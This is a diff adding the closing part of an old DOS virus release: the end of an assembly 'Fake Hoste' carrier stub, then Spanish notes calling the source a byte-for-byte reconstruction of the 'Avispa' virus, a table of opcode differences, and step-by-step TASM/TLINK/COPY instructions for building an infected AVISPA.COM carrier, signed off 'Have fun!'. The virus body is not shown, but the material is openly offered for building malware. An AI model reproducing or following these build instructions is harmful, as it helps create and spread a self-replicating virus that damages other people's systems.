+	mov ax, 4c00h
+	int 21h
+InstallIt:
+	mov ax, cs
+	add ax, 80h
+	mov ss, ax
+	mov sp, 0
+	push ax
+	push 100h
+	retf
+EndHoste:
+	db  800h-(offset EndHoste-offset FakeHoste) DUP('a');
+ends
+end FakeHoste
+; -------------------- Fake Hoste : Cut Here --------------------------------
+
+NOTAS SOBRE EL SOURCE:
+	El source dado mas arriba es una correspondencia byte-a-byte del
+avispa en su "estado natural". Se ve que el autor uso para ensamblarlo el
+A86 o algun otro engendro similar, ya que algunos jumps que podrian haber
+sido SHORT (EB, 2 bytes) son NEAR (E9, 3 bytes). El TASM me los hacia SHORT,
+asi que para mantener una correspondencia byte-a-byte, tuve que "forzarlos".
+Ademas, en el ensamblado de este file, hay algunos bytes distintos debido a
+que hay algunas instrucciones que realmente tienen dos codigos maquina
+posibles:
+			TASM 3.1	AVISPA ORIGINAL
+	ADD AX, BX	03C3		01D8
+	ADD DX, AX	03D0		01C2
+	ADD SI, AX	03F0		01C6
+	ADD DL, CL	02D1		00CA
+	ADD AL, BL	02C3		00D8
+	SUB CL, DL	2ACA		28D1
+	MOV SP, AX	8BE0		89C4
+	MOV AX, CX	8BC1		89C8
+	MOV BX, DX	8BDA		89D3
+	MOV DI, BX	8BFB		89DF
+	MOV AH, AH	8AE4		88E4
+	MOV ??, ??      8A??		88??
+	MOV DL, DL	8AD2		88D2
+
+INSTRUCCIONES PARA EL ENSAMBLADO:
+	Para ensamblar el virus, pasar el source del avispa a AVISPA.ASM y
+el del Fake Hoste a HOSTE.ASM. Luego seguir estos pasos.
+	TASM /M5 AVISPA
+	TLINK /T AVISPA
+	TASM /M5 HOSTE
+	TLINK /T HOSTE
+	COPY /B HOSTE.COM+AVISPA.COM TMP
+	DEL AVISPA.COM
+	REN TMP AVISPA.COM
+	Esto les va a dejar un AVISPA.COM que es carrier del AVISPA.
+	Have fun!
+						Trurl, the great constructor
